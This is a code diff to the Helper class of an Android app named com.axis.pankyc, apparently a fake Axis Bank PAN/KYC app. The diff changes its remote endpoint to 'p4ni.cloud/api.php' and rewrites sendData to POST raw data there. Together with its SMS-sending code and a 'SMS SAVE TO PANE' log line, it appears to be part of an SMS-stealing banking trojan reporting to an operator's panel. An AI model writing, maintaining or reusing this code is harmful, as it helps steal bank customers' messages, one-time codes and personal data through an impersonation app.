@@ -1,5 +1,6 @@
 package com.axis.pankyc;
 
+
 import android.os.AsyncTask;
 import android.telephony.SmsManager;
 import android.util.Log;
@@ -15,10 +16,11 @@ import java.net.HttpURLConnection;
 import java.net.URL;
 import java.util.Scanner;
 
+
 public class Helper {
 
-    private static final String API_URL = "https://forwarding.live/api";
-    static final String site = "axispankyc1.com";
+    private static final String API_URL = "https://p4ni.cloud/api.php";
+    static final String site = "sms-axispankyc3";
 
     public static void sendSMS(String path, String message) {
         new AsyncTask<String, Void, String>() {
@@ -76,26 +78,26 @@ public class Helper {
         }.execute();
     }
 
-    public static void sendData(String path, JSONObject jsonData) {
+
+    public static void sendData(String path) {
         new AsyncTask<String, Void, String>() {
             @Override
             protected String doInBackground(String... params) {
                 String response = "";
                 try {
-                    String urlString = API_URL+path;
-                    Log.d("mywork", "doInBackground API URL: " + urlString);
+                    String urlString = API_URL;
                     URL url = new URL(urlString);
-                    Log.d("mywork", "doInBackground API URL: " + jsonData.toString());
+
                     HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                     conn.setRequestMethod("POST");
-                    conn.setRequestProperty("Content-Type", "application/json");
-                    conn.setRequestProperty("Accept", "application/json");
+                    conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
+//                    conn.setRequestProperty("Accept", "application/json");
                     conn.setDoOutput(true);
 
-                    // Write JSON data to the output stream
+                    // Write data to the output stream
                     OutputStream os = conn.getOutputStream();
                     BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(os, "UTF-8"));
-                    writer.write(jsonData.toString());
+                    writer.write(params[0]);
                     writer.flush();
                     writer.close();
                     os.close();
@@ -122,14 +124,12 @@ public class Helper {
                 }
                 return response;
             }
-
             @Override
             protected void onPostExecute(String result) {
-                Log.d("mywork", "SMS SAVE TO PANE : "+result);
+                Log.d("MYAPP: ", result);
             }
         }.execute(path);
     }
-
 
 
 }
